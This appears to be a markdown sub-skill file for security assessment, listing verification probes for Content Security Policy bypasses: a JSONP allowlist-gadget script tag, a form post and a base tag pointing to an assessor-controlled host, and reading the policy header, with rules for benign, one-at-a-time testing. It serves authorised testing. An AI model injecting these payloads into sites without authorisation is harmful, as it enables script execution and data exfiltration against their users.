# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`cross-site-scripting-csp-bypass`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `cross-site-scripting-csp-bypass`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### Allowlist-gadget execution

**Expected differential:** script loads from an allowlisted host's callback endpoint while a plain inline script is blocked, proving a gadget bypass

```text
<script src="https://accounts.example/jsonp?callback=cspProbeFn"></script>
inline control: <script>cspProbeFn=1</script> (expected to be blocked and reported)
```

### Missing form-action egress

**Expected differential:** a benign cross-origin form post succeeds because form-action is unset and does not inherit from default-src

```text
<form action="https://<assessor-controlled-host>/csp-formaction" method="POST"><input name="probe" value="cspFormProbe"></form>
```

### Missing base-uri retarget

**Expected differential:** an injected base tag changes the resolution of a relative script URL when base-uri is absent

```text
<base href="https://<assessor-controlled-host>/csp-base/"> (relative script then resolves offsite)
```

### Policy inspection

**Expected differential:** the response policy is read to confirm host-allowlist shape versus nonce-plus-strict-dynamic before any gadget test

```text
GET / and read the Content-Security-Policy response header verbatim
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
